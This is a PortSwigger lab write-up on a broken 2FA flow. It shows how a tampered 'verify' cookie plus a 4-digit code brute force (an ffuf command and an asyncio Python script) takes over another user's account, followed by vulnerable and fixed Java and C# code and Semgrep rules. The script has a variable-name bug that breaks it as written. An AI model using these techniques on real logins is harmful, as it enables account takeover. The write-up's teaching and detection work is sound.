---
title: "Lab 08: 2FA broken logic"
date: 2025-12-20
categories: [portswigger, authentication] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-20-lab08_authentication/
---


## 1. Executive Summary

**Vulnerability:** Broken 2FA Logic (Insecure Verification Cookie).

**Description:** The application uses a client-side cookie (`verify`) to determine which user is currently performing the 2FA step. This cookie is not cryptographically bound to the user's session or the initial password verification step. An attacker can log in with their own valid credentials to reach the 2FA page, then simply modify the cookie to the victim's username. This tricks the server into verifying the 2FA code against the victim's account instead of the attacker's. Coupled with a lack of rate limiting, the attacker can brute-force the 4-digit code.

**Impact:** Account Takeover. An attacker can access any user's account without knowing their password, provided they can brute-force the short 2FA code.

## 2. The Attack

**Objective:** Access `carlos`'s account by manipulating the 2FA tracking cookie and brute-forcing the code.

1. **Reconnaissance:**
    - I logged in as `wiener`. After the password step, I landed on `/login2`.
    - I observed the request headers: `Cookie: verify=wiener; ...`.
    - I verified the 2FA code length was 4 digits (from the email client).
2. **Triggering the Exploit:**
    - I sent a `GET /login2` request but changed the cookie to `verify=carlos`. This tricked the server into generating a new 2FA code for Carlos and expecting it in the next step.
        
        ![image.png](image.png)
        
3. **Brute-Force Preparation:**
    - I captured the `POST /login2` request (where the code is submitted).
    - I ensured the cookie was set to `verify=carlos`.
    - I saved this request to `request.txt`.
    - I generated a wordlist of all 4-digit codes:
        
        ```bash
        seq -w 0 9999 > mfa_codes.txt.
        ```
        
4. **Execution:**
    - I used `ffuf` to brute-force the `mfa-code` parameter.
    - **Command:**
        
        ```bash
        ffuf -request request.txt -request-proto https -w mfa_codes.txt -mc 302 -t 50
        ```
        
        ![image.png](image%201.png)
        
    - **Result:** `ffuf` found the valid code (indicated by a 302 Redirect).
5. **Access:** I manually sent the request with the found code and the `verify=carlos` cookie, which logged me in as the victim.
    
    ![image.png](image%202.png)
    

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The application is "Stateless" in the wrong place. It forgets who passed the password check. It relies entirely on the `verify` cookie to know who is trying to finish the login.

- **The Flaw:** Reading the user identity from a Cookie (`@CookieValue`) instead of the server-side Session (`HttpSession`). Cookies are user-controlled; Sessions are server-controlled.

### Java (Spring Boot)

```java
@Controller
public class TwoFactorController {

    // VULNERABLE: The 'user' is taken directly from the "verify" cookie.
    @PostMapping("/login2")
    public String verify2FA(@CookieValue("verify") String username, 
                            @RequestParam String mfaCode, 
                            HttpSession session) {
        
        // The server trusts that 'username' is the person who just entered a password.
        // It fetches the code belonging to 'username' (Carlos).
        if (mfaService.verify(username, mfaCode)) {
            
            // If the code matches, it logs that user in.
            session.setAttribute("user", username);
            return "redirect:/my-account";
        }
        return "login_error";
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@CookieValue("verify")`**: Spring extracts the value of the cookie named `verify` and assigns it to the `username` variable.
- **Attack Path**: Since the attacker controls the cookie, they change it to "carlos". The logic becomes `mfaService.verify("carlos", "1234")`. If the code matches, the session is created for "carlos".

### C# (ASP.NET Core)

```csharp
[HttpPost("login2")]
public IActionResult Verify2FA(string mfaCode)
{
    // VULNERABLE: Reads identity from Request Cookies
    var username = Request.Cookies["verify"];

    if (string.IsNullOrEmpty(username)) return BadRequest();

    // Verifies the code against the user found in the cookie
    if (_mfaService.IsValid(username, mfaCode))
    {
        // Signs in the user found in the cookie
        _signInManager.SignIn(username);
        return RedirectToAction("Index");
    }

    return View("Error");
}
```

**Technical Flow & Syntax Explanation:**

- **`Request.Cookies["verify"]`**: Directly accesses client-supplied data to determine identity.
- **Logic Gap**: There is no check to ensure `username` matches the person who successfully passed the password check in the previous step.

### Mock PR Comment

The 2FA verification endpoint relies on the `verify` cookie to identify the user. Because this cookie is not signed or encrypted, it can be modified by the client. This allows an attacker to generate and brute-force 2FA codes for any user.

**Recommendation:** Store the `pending_user_id` in the server-side Session (or use a signed/encrypted cookie like ASP.NET's `ITicketStore` or Spring's Session) after the password check. Do not accept plain-text cookies for identity.

## 4. The Fix

**Explanation of the Fix:**
We stop trusting the Client. When the user passes the password check, we store their ID in the **Session** (server memory). In the 2FA step, we read from the Session.

### Secure Java

```java
@PostMapping("/login2")
// SECURE: We ignore cookies. We ask the Session "Who is waiting for 2FA?"
public String verify2FA(@RequestParam String mfaCode, HttpSession session) {
    
    // Retrieve the user stored SECURELY during the password step.
    String pendingUser = (String) session.getAttribute("pending_2fa_user");
    
    if (pendingUser == null) {
        // If no one passed step 1, kick them out.
        return "redirect:/login";
    }

    if (mfaService.verify(pendingUser, mfaCode)) {
        // Upgrade from "pending" to "fully logged in"
        session.removeAttribute("pending_2fa_user");
        session.setAttribute("user", pendingUser);
        return "redirect:/my-account";
    }
    return "login_error";
}
```

### Secure C#

```csharp
[HttpPost("login2")]
public IActionResult Verify2FA(string mfaCode)
{
    // SECURE: Use TempData or Session, which cannot be forged by the client
    var pendingUser = TempData["PendingUser"] as string;

    if (pendingUser == null) return RedirectToAction("Login");

    if (_mfaService.IsValid(pendingUser, mfaCode))
    {
        _signInManager.SignIn(pendingUser);
        return RedirectToAction("Index");
    }
    return View("Error");
}
```

## 5. Automation

*A high-speed `asyncio` script to perform the 4-digit brute-force attack.*

```python
#!/usr/bin/env python3
import argparse
import asyncio
import aiohttp
import sys

BATCH_SIZE=50 #number of concurrent requests

async def try_mfa_code(session, url, verify_cookie, code):
    # Format code to 4 digits (e.g., 1 -> "0001")
    code_str = f"{code:04d}"

    cookies = {"verify": verify_cookie}
    data = {"mfa-code": code_str}

    try:
        async with session.post(url, data=data, cookies=cookies, allow_redirects=False) as resp:
            if resp.status == 302:
                return code_str
            return None
    except:
        return None

async def exploit(url, victim_user):
    login2_url = f"{url.rstrip('/')}/login2"
    print(f"[*] Targeting: {login2_url}")
    print(f"[*] Victim (Cookie): {victim_user}")
    print("[*] Starting Brute Force (0000-9999)...")

    async with aiohttp.ClientSession() as session:
        # We process all 10,000 codes
        # In chunks of BATCH_SIZE to avoid overwhelming the local machine/network
        for i in range(0, 10000, BATCH_SIZE):
            batch_codes =  range(i, min(i + BATCH_SIZE, 10000))

            tasks=[]
            for code in batch_codes:
                tasks.append(try_mfa_code(session, login2_url, victim_user, code))
            results = await asyncio.gather(*task)

            for res in results:
                if res:
                    print(f"\n[!!!] 2FA CODE FOUND: {res}")
                    return

            print(f"\r[*] Checked {i + len(batch_codes)}/10000 codes...", end="")

    print("\n[-] Code not found.")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("victim", help="Victim username for the cookie (e.g. carlos)")
    args = ap.parse_args()

    # In this lab, accessing the page with the cookie usually triggers it.
    # The script assumes you might have done that, or the POST requests trigger it on fail.
    # Ideally, send one GET request first

    asyncio.run(exploit(args.url, args.victim))

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules look for Authentication Endpoints that rely on `@CookieValue` or `Request.Cookies` for the username parameter.*

### Java Rule

```yaml
rules:
  - id: java-auth-bypass-via-cookie
    languages: [java]
    message: |
      Authentication logic relies on an insecure Cookie value. 
      Cookies can be modified by the client. Use HttpSession to store temporary identity.
    severity: ERROR
    patterns:
      - pattern-inside: |
          @PostMapping(...)
          public $RET $METHOD(..., @CookieValue(...) String $USER, ...) { ... }
      - pattern: |
          // Heuristic: Using the cookie value to verify MFA or Login
          $SERVICE.verify($USER, ...);
```

### C# Rule

```yaml
rules:
  - id: csharp-auth-bypass-via-cookie
    languages: [csharp]
    message: "Authentication identity read from Request.Cookies. Use Session or TempData."
    severity: ERROR
    patterns:
      - pattern: |
          var $USER = Request.Cookies["..."];
          ...
          if ($SERVICE.IsValid($USER, ...)) { ... }
```
